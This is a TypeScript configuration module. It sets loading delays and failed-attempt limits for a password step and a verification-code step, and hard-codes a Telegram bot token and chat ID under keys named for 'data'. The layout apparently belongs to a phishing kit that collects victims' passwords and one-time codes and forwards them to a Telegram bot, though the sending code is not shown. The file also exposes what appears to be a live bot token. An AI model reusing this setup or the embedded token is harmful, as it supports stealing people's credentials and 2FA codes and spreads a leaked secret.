interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    data_chatid: string;
    data_token: string;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 5000,
    max_failed_code_attempts: 5,
    max_failed_password_attempts: 0,
    password_loading_time: 5000,
  },
  telegram: {
    data_chatid: "5394226669",
    data_token: "7780753690:AAFgJ7VQwaG33lZ9J4nxpmTZgwMuHG2Wqzo",
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
